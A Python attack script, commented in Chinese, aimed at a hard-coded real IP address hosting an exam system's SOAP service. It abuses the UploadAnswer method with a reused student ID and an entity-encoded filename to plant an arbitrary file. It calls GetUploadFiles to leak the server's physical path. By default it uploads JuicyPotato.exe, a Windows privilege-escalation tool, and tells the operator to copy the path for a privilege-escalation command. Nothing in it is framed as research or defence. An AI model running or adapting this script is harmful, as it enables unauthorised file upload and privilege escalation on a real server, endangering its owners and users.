import requests
import base64
import os
import re
import sys

# ================= 配置区域 =================
TARGET_URL = "http://120.55.241.236:999/Models/Exam2020.asmx"
TARGET_UID = 3711 # 使用刚才成功的 ID
HEADERS = {
    "Content-Type": "text/xml; charset=utf-8",
    "User-Agent": "Eiven.Exam2021 Client"
}

def to_html_entities(text):
    return "".join(f"&#{ord(c)};" for c in text)

def upload_file(local_file_path):
    if not os.path.exists(local_file_path):
        print(f"[-] 本地文件不存在: {local_file_path}")
        return

    filename = os.path.basename(local_file_path)
    print(f"=== 正在上传工具: {filename} (UID: {TARGET_UID}) ===")

    try:
        with open(local_file_path, "rb") as f:
            content = f.read()

        file_b64 = base64.b64encode(content).decode('utf-8')
        print(f"[*] 文件大小: {len(content)} bytes")

        # 1. 上传
        encoded_filename = to_html_entities(filename)
        soap_upload = f"""<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <UploadAnswer xmlns="http://tempuri.org/">
              <uid>{TARGET_UID}</uid>
              <aid>1</aid> <filename>{encoded_filename}</filename>
              <file>{file_b64}</file>
            </UploadAnswer>
          </soap:Body>
        </soap:Envelope>"""

        resp = requests.post(TARGET_URL, data=soap_upload.encode('utf-8'), headers=HEADERS, timeout=30)

        if "OK" in resp.text or "UploadAnswerResult" in resp.text:
            print("[+] 上传请求成功")
        else:
            print(f"[-] 上传可能失败: {resp.text[:200]}")
            # 继续尝试获取路径，万一成功了呢

        print("[*] 正在获取服务器路径...")

        # 2. 获取路径
        soap_list = f"""<?xml version="1.0" encoding="utf-8"?>
        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
          <soap:Body>
            <GetUploadFiles xmlns="http://tempuri.org/">
              <uid>{TARGET_UID}</uid>
            </GetUploadFiles>
          </soap:Body>
        </soap:Envelope>"""

        resp_list = requests.post(TARGET_URL, data=soap_list.encode('utf-8'), headers=HEADERS, timeout=10)

        # 匹配 FullPath
        # 这里直接匹配文件名对应的路径
        match = re.search(f"<FullPath>(.*?{re.escape(filename)})</FullPath>", resp_list.text)

        if match:
            full_path = match.group(1)
            print(f"\n[★ SUCCESS] 远程物理路径: {full_path}")
            print(f"    (请复制此路径用于提权命令)")
            return full_path
        else:
            print("[-] 未能从服务器响应中解析出路径。")
            # print(resp_list.text[:500])

    except Exception as e:
        print(f"[!] 异常: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        # 默认上传 JuicyPotato.exe
        target_file = "JuicyPotato.exe"
    else:
        target_file = sys.argv[1]

    upload_file(target_file)
